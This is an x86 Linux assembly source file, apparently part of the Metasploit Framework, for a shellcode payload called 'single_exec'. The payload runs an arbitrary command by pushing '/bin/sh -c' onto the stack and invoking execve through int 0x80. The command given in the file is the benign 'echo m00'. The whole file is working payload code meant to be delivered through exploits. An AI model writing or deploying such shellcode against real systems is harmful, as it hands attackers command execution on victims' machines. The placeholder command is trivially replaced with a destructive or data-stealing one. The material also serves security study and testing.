;;
;
;        Name: single_exec
;   Platforms: Linux
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Version: $Revision: 1466 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Execute an arbitary command.
;
;;
; NULLs are fair game people.

BITS 32
global _start

_start:
  push	byte 0xb
  pop	eax
  cdq

  push	edx
  push	word 0x632d
  mov	edi, esp

  push	dword 0x0068732f
  push	dword 0x6e69622f
  mov	ebx, esp

  push	edx
  call	getstr
db "echo m00", 0x00
getstr:
  push	edi
  push	ebx
  mov	ecx, esp
  int	0x80

